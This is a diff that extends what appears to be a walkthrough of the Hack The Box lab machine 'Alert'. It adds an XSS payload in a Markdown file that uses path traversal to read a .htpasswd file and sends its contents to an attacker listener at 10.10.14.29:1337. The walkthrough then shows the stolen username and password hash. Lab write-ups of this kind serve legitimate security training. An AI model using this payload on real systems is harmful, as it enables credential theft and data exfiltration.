@@ -322,4 +322,35 @@ david:x:1001:1002:,,,:/home/david:/bin/bash
 </pre>
 ```
 
-Finally, let's see if we can view the .htpasswd file. The .htpassd file that stores user names and their encrypted passwords, used for basic authentication. The .htpasswd file can be placed in any directory, but it's common to store it in a secure location, such as /etc/apache2/ or /usr/local/apache/conf/.
+Finally, let's see if we can view the .htpasswd file. The .htpassd file that stores user names and their encrypted passwords, used for basic authentication. The .htpasswd file can be placed in any directory, but it's common to store it in a secure location, such as /etc/apache2/ or /usr/local/apache/conf/. If I had to guess, this finally means that we get to use that statistics sub-domain that we found earlier. Let's name our final file EXPLIOT.md, and populate it thusly:
+
+```
+<script>
+fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
+  .then(response => response.text())
+  .then(data => {
+    fetch("http://10.10.14.29:1337/?file_content=" + encodeURIComponent(data));
+  });
+</script>
+```
+
+[](./.images/Screenshot_Alert-LFI-1.png)
+
+[](./.images/Screenshot_Alert-LFI-2.png)
+
+[](./.images/Screenshot_Alert-LFI-3.png)
+
+[](./.images/Screenshot_Alert-LFI-4.png)
+
+[](./.images/Screenshot_Alert-LFI-5.png)
+
+[](./.images/Screenshot_Alert-LFI-6.png)
+
+[](./.images/Screenshot_Alert-LFI-7.png)
+
+And that looks like a username and a password hash:
+
+```
+<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+</pre>
+```
